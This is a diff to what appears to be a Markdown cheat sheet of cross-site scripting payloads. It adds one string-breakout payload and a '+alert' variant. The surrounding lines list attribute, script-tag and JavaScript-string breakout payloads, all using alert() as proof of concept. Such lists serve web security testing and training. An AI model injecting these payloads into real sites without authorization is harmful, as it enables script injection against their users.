@@ -23,10 +23,11 @@ OR
 " autofocus onfocus=alert(document.domain) x="
 
 <a href="javascript:alert(document.domain)"> 
+* \"-alert(1)
 
 ## XSS into JavaScript
 * Breaking out of JS: </script><img src=1 onerror=alert(document.domain)>  or with alert(1)
-* Breaking out of a JavaScript string: `'-alert(document.domain)-'` OR `';alert(document.domain)//`
+* Breaking out of a JavaScript string: `'-alert(document.domain)-'` OR `';alert(document.domain)//` also works with `+alert`
 * in case application is escaping `'` => might help: `\';alert(document.domain)//`
 
 ## Making use of HTML-encoding
